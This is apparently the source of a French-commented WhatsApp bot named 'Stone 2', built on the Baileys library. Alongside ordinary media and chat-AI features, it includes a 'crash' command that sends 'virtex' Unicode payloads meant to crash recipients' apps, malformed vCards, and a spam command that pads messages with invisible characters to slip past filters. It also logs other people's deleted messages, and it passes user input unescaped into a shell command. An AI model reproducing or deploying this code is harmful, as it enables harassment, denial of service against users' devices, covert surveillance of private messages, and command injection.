const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, DisconnectReason, downloadMediaMessage } = require("@whiskeysockets/baileys");
const { Boom } = require("@hapi/boom");
const pino = require("pino");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const { exec, execSync } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const { Jimp } = require("jimp");
const readline = require("readline");
const { OpenAI } = require("openai");

// --- CONFIGURATION ---
const groq = new OpenAI({
    apiKey: process.env.GROQ_API_KEY || "gsk_yK6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Ym6Y",
    baseURL: "https://api.groq.com/openai/v1",
});

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const question = (text) => new Promise(resolve => rl.question(text, resolve));

const SESSIONS_DIR = path.join(__dirname, "sessions");
const TEMP_DIR = path.join(__dirname, "temp");
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR, { recursive: true });
if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

// --- COLLECTIONS DE TEXTES SPÉCIAUX (VIRTEX) ---
const VIRTEX_PAYLOADS = [
    "\u200e\u200f".repeat(15000), // Caractères de direction RTL/LTR (Surcharge de rendu)
    "\u00ad".repeat(15000), // Soft Hyphen
    "\u200b".repeat(25000), // Zero-width space (Saturation de mémoire)
    "\u061c".repeat(15000), // Arabic Letter Mark
    "జ్ఞా".repeat(5000), // Telugu character (Crash de rendu sur certains OS)
    "0".repeat(100000), // Surcharge de buffer simple
    "🔴".repeat(10000) + "⚫".repeat(10000), // Crash visuel
    "🏳️‍🌈".repeat(5000) + "🏴‍☠️".repeat(5000) // Surcharge d'emojis complexes
];

const ADVANCED_VCARDS = [
    'BEGIN:VCARD\nVERSION:3.0\nFN:' + "☣️".repeat(5000) + '\nORG:' + "🔥".repeat(5000) + ';\nEND:VCARD',
    'BEGIN:VCARD\nVERSION:3.0\nFN:System Error\nTEL;type=CELL;type=VOICE;type=pref:+' + "1".repeat(1000) + '\nEND:VCARD'
];

// --- VARIABLES GLOBALES ---
const activeSessions = new Map();
const hostingStates = new Map(); // Pour suivre les utilisateurs en cours d'hébergement
const messageCache = new Map(); // Cache pour l'anti-suppression et alt-delete
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// --- FONCTIONS UTILITAIRES ---

const getInvisibleJunk = () => {
    const chars = ["\u200B", "\u200C", "\u200D"];
    let junk = "";
    const length = Math.floor(Math.random() * 5) + 1;
    for (let i = 0; i < length; i++) {
        junk += chars[Math.floor(Math.random() * chars.length)];
    }
    return junk;
};

async function downloadYouTubeMP3(query) {
    return new Promise((resolve, reject) => {
        const filename = `audio_${Date.now()}.mp3`;
        const outputPath = path.join(TEMP_DIR, filename);
        const cmd = `yt-dlp -x --audio-format mp3 --embed-thumbnail --add-metadata -o "${outputPath}" "ytsearch1:${query}"`;
        
        exec(cmd, (error, stdout, stderr) => {
            if (error) {
                reject(new Error(`Échec du téléchargement YouTube: ${stderr || error.message}`));
            } else {
                resolve(outputPath);
            }
        });
    });
}

async function uploadToCatbox(buffer, filename) {
    const tempPath = path.join(TEMP_DIR, `upload_${Date.now()}_${filename}`);
    fs.writeFileSync(tempPath, buffer);
    try {
        const cmd = `curl -F "reqtype=fileupload" -F "fileToUpload=@${tempPath}" https://catbox.moe/user/api.php`;
        const link = execSync(cmd).toString().trim();
        return link;
    } catch (e) {
        console.error("Catbox upload error:", e);
        return null;
    } finally {
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
    }
}

function logDeletedMessage(phoneNumber, remoteJid, senderName, originalText) {
    const time = new Date().toLocaleTimeString();
    const cleanJid = remoteJid.split("@")[0];
    const border = "╔══════════════════════════════════════════════════════════════════════════════╗";
    const footer = "╚══════════════════════════════════════════════════════════════════════════════╝";
    
    console.log("\n" + border);
    console.log(`║ ⚠️  ALERTE : MESSAGE SUPPRIMÉ PAR L'UTILISATEUR`);
    console.log(`║ 🕒 HEURE   : ${time}`);
    console.log(`║ 👤 DE      : ${senderName || "Inconnu"} (${cleanJid})`);
    console.log("╟──────────────────────────────────────────────────────────────────────────────╢");
    
    const maxWidth = 74;
    const lines = originalText ? originalText.match(new RegExp(".{1," + maxWidth + "}", "g")) : ["[Contenu non récupérable]"];
    if (lines) {
        lines.forEach(line => {
            console.log(`║ 🗑️  ANCIEN  : ${line.padEnd(maxWidth)} ║`);
        });
    }
    console.log(footer + "\n");
}

function logMessage(phoneNumber, remoteJid, senderName, text, type) {
    const time = new Date().toLocaleTimeString();
    const cleanJid = remoteJid.split("@")[0];
    const border = "╔══════════════════════════════════════════════════════════════════════════════╗";
    const footer = "╚══════════════════════════════════════════════════════════════════════════════╝";
    
    console.log("\n" + border);
    console.log(`║ 🕒 HEURE   : ${time}`);
    console.log(`║ 📱 BOT     : [${phoneNumber}]`);
    console.log(`║ 👤 DE      : ${senderName || "Inconnu"} (${cleanJid})`);
    console.log(`║ 📂 TYPE    : ${type.toUpperCase()}`);
    console.log("╟──────────────────────────────────────────────────────────────────────────────╢");
    
    const maxWidth = 74;
    const lines = text ? text.match(new RegExp(".{1," + maxWidth + "}", "g")) : ["[Pas de contenu texte]"];
    if (lines) {
        lines.forEach(line => {
            console.log(`║ 💬 MSG     : ${line.padEnd(maxWidth)} ║`);
        });
    }
    console.log(footer + "\n");
}

async function sendMenuAudio(sock, remoteJid, quoted) {
    const audioUrl = "https://files.catbox.moe/azu9je.mp3";
    const tempInput = path.join(TEMP_DIR, `menu_in_${Date.now()}.mp3`);
    const tempOutput = path.join(TEMP_DIR, `menu_out_${Date.now()}.opus`);

    try {
        const response = await axios({ url: audioUrl, method: "GET", responseType: "stream" });
        const writer = fs.createWriteStream(tempInput);
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on("finish", resolve);
            writer.on("error", reject);
        });

        await new Promise((resolve, reject) => {
            ffmpeg(tempInput)
                .audioCodec("libopus")
                .toFormat("ogg")
                .addOptions(["-ac", "1", "-ar", "48000", "-b:a", "128k", "-map_metadata", "-1"])
                .on("end", resolve)
                .on("error", reject)
                .save(tempOutput);
        });

        await sock.sendMessage(remoteJid, { 
            audio: fs.readFileSync(tempOutput), 
            mimetype: "audio/ogg; codecs=opus", 
            ptt: true 
        }, { quoted });

    } catch (e) {
        console.error("Erreur audio menu:", e);
    } finally {
        if (fs.existsSync(tempInput)) fs.unlinkSync(tempInput);
        if (fs.existsSync(tempOutput)) fs.unlinkSync(tempOutput);
    }
}

async function getGroqResponse(userMessage) {
    try {
        const completion = await groq.chat.completions.create({
            messages: [{ role: "system", content: "Tu es Stone 2, créé par Moussa Kamara." }, { role: "user", content: userMessage }],
            model: "llama-3.1-8b-instant",
        });
        return completion.choices[0]?.message?.content || "Désolé, je bug.";
    } catch (e) { return "IA indisponible."; }
}

// --- FONCTION PRINCIPALE DU BOT ---

async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify = null) {
    const cleanNumber = phoneNumber.replace(/[^0-9]/g, "");
    const sessionPath = path.join(SESSIONS_DIR, cleanNumber);
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    // Log pour aider au débogage
    const isRegistered = state.creds && state.creds.registered;
    if (isRegistered) {
        console.log(`[${cleanNumber}] ✅ Session existante détectée. Connexion directe...`);
    } else {
        console.log(`[${cleanNumber}] ❌ Aucune session enregistrée. Préparation à la demande de code d'appairage.`);
    }

    const sock = makeWASocket({
        version,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["Ubuntu", "Chrome", "120.0.0.0"],
        syncFullHistory: true,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
    });

    activeSessions.set(cleanNumber, { sock, isBotActive: false, activeSpams: new Set() });

    // --- DEMANDE DE CODE D'APPAIRAGE (UNIQUEMENT SI NON ENREGISTRÉ) ---
    if (!isRegistered) {
        try {
            await sleep(5000); // Attendre que la socket soit prête
            const code = await sock.requestPairingCode(cleanNumber);
            const msg = `✅ *SESSION GÉNÉRÉE*\n\nNuméro : ${cleanNumber}\nCode : *${code}*`;
            console.log(`Code d'appairage pour ${cleanNumber} : ${code}`);
            if (sockToNotify && jidToNotify) {
                await sockToNotify.sendMessage(jidToNotify, { text: msg });
            }
        } catch (e) {
            console.error("Erreur lors de la demande du code :", e);
        }
    }

    // Gérer les mises à jour de connexion
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const isUnauthorized = (lastDisconnect.error instanceof Boom) && (lastDisconnect.error.output.statusCode === 401 || lastDisconnect.error.output.statusCode === DisconnectReason.loggedOut);
            const shouldReconnect = !isUnauthorized;
            console.log('connection closed due to ', lastDisconnect.error, ', reconnecting ', shouldReconnect);
            if (isUnauthorized) {
                console.log(`Session pour ${cleanNumber} invalide. Suppression des fichiers de session.`);
                // Optionnel: fs.rmSync(sessionPath, { recursive: true, force: true });
            } else if (shouldReconnect) {
                await sleep(5000); 
                createBotInstance(phoneNumber, sockToNotify, jidToNotify);
            }
        } else if (connection === 'open') {
            console.log(`[${cleanNumber}] ✅ Connexion établie avec succès.`);
        }
    });

    sock.ev.on("creds.update", saveCreds)
    
    // Gestion de la synchronisation de l'historique
    sock.ev.on("messaging-history.set", async ({ messages, isLatest }) => {
        if (!messageCache.has(cleanNumber)) messageCache.set(cleanNumber, new Map());
        const sessionCache = messageCache.get(cleanNumber);
        for (const m of messages) {
            if (m.message && m.key.remoteJid !== "status@broadcast") {
                const text = (m.message.conversation || m.message.extendedTextMessage?.text || "").trim();
                sessionCache.set(m.key.id, { text, senderName: m.pushName || "Inconnu", remoteJid: m.key.remoteJid });
            }
        }
    });

    // Anti-suppression
    sock.ev.on("messages.update", async (updates) => {
        for (const update of updates) {
            if (update.update.messageStubType === 2 && update.update.key.fromMe === false) {
                const deletedMessageId = update.update.key.id;
                const sessionCache = messageCache.get(cleanNumber);
                if (sessionCache && sessionCache.has(deletedMessageId)) {
                    const originalMessage = sessionCache.get(deletedMessageId);
                    logDeletedMessage(cleanNumber, originalMessage.remoteJid, originalMessage.senderName, originalMessage.text);
                    sessionCache.delete(deletedMessageId);
                }
            }
        }
    });

    // Gestion des messages entrants
    sock.ev.on("messages.upsert", async ({ messages, type }) => {
        if (type === "notify") {
            for (const msg of messages) {
                if (!msg.message) continue;
                if (msg.key.remoteJid === "status@broadcast") continue;
                if (msg.key.fromMe) continue;

                const remoteJid = msg.key.remoteJid;
                const senderName = msg.pushName || "Inconnu";
                const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
                const lowerText = text.toLowerCase();
                const isFromMe = msg.key.fromMe;

                logMessage(cleanNumber, remoteJid, senderName, text, "TEXT");
                const current = activeSessions.get(cleanNumber);

                if (lowerText === "on") {
                    current.isBotActive = true;
                    await sock.sendMessage(remoteJid, { text: "✅ IA activée." });
                    return;
                }
                if (lowerText === "off") {
                    current.isBotActive = false;
                    await sock.sendMessage(remoteJid, { text: "🛑 IA désactivée." });
                    return;
                }
                if (lowerText === "stop") {
                    if (current.activeSpams.size > 0) {
                        current.activeSpams.forEach(timeoutId => clearInterval(timeoutId));
                        current.activeSpams.clear();
                        await sock.sendMessage(remoteJid, { text: "✅ Tous les spams ont été arrêtés." });
                    } else {
                        await sock.sendMessage(remoteJid, { text: "❌ Aucun spam en cours." });
                    }
                    return;
                }

                // Spam
                if (lowerText.startsWith("love ")) {
                    const parts = text.slice(5).trim().split(" ");
                    if (parts.length >= 2) {
                        const spamText = parts.slice(0, -2).join(" ");
                        const count = parseInt(parts[parts.length - 2]);
                        const delay = parseInt(parts[parts.length - 1]);
                        if (!isNaN(count) && !isNaN(delay) && count > 0 && delay >= 0) {
                            await sock.sendMessage(remoteJid, { text: `💖 Lancement du spam '${spamText}' ${count} fois.` });
                            let sentCount = 0;
                            const spamInterval = setInterval(async () => {
                                if (sentCount < count) {
                                    await sock.sendMessage(remoteJid, { text: spamText + getInvisibleJunk() });
                                    sentCount++;
                                } else {
                                    clearInterval(spamInterval);
                                    current.activeSpams.delete(spamInterval);
                                    await sock.sendMessage(remoteJid, { text: `✅ Spam '${spamText}' terminé.` });
                                }
                            }, delay);
                            current.activeSpams.add(spamInterval);
                        }
                    }
                    return;
                }

                // Crash commands
                if (lowerText.startsWith("crash ")) {
                    const index = parseInt(lowerText.slice(6).trim());
                    if (!isNaN(index) && index >= 0 && index < VIRTEX_PAYLOADS.length) {
                        await sock.sendMessage(remoteJid, { text: VIRTEX_PAYLOADS[index] });
                    }
                    return;
                }

                if (lowerText === "menu") {
                    const menu = `*STONE 2 - MENU*\n- *on/off* : IA\n- *video [nom]* : YouTube\n- *s* : Sticker\n- *save* : Vue unique\n- *host* : Catbox\n- *love* : Spam\n- *crash* : Virtex`;
                    await sock.sendMessage(remoteJid, { image: { url: "https://files.catbox.moe/6uhomx.png" }, caption: menu }, { quoted: msg });
                    return;
                }

                // IA Groq
                if (current.isBotActive && !isFromMe && text && !["menu", "save", "vv", "s", "sticker", "host", "on", "off", "stop"].includes(lowerText) && !lowerText.startsWith("connect ") && !lowerText.startsWith("video ") && !lowerText.startsWith("rappel ")) {
                    const res = await getGroqResponse(text);
                    await sock.sendMessage(remoteJid, { text: res });
                }
            }
        }
    });
}

async function start() {
    console.log("--- DÉMARRAGE STONE 2 ---");
    const mainNum = "16062620863"; 
    createBotInstance(mainNum.replace(/[^0-9]/g, ""));
}

start();
